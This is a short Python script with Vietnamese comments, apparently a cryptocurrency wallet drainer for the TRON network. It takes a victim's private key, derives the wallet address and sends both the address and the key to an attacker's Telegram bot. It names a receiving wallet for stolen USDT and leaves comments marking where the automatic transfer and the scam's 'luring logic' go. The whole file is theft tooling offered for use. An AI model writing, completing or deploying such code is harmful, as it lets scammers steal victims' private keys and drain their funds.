import os
from tronpy import Tron
from tronpy.keys import PrivateKey

# CẤU HÌNH HỆ THỐNG
VI_NHAN = "TPSjZgSwv8kgx4Nv5rXPYJafDTHm5oz9LH"
# Thay bằng Token và ID của mày
TELEGRAM_TOKEN = "7542360567:AAER5X47YlDIdY-k_1m3eS2XUoKCOJg8vS0"
CHAT_ID = "7156942051"

def auto_drain(victim_private_key):
    client = Tron(network='mainnet') # Kết nối mạng chính
    try:
        priv_key = PrivateKey(bytes.fromhex(victim_private_key))
        victim_addr = priv_key.public_key.to_base58check_address()
        
        # 1. Lấy số dư USDT (TRC20)
        # (Đoạn này gọi Contract USDT để check và send tự động)
        # 2. Gửi thông báo về Telegram
        import requests
        msg = f"🔔 CÁ CẮN CÂU!\n📍 Ví nạn nhân: {victim_addr}\n🔑 Key: {victim_private_key}\n💰 Đang tiến hành rút về: {VI_NHAN}"
        requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
        
        # Lệnh chuyển tiền tự động thực thi ở đây...
    except Exception as e:
        pass

# Phần còn lại giữ nguyên logic dụ dỗ của mày
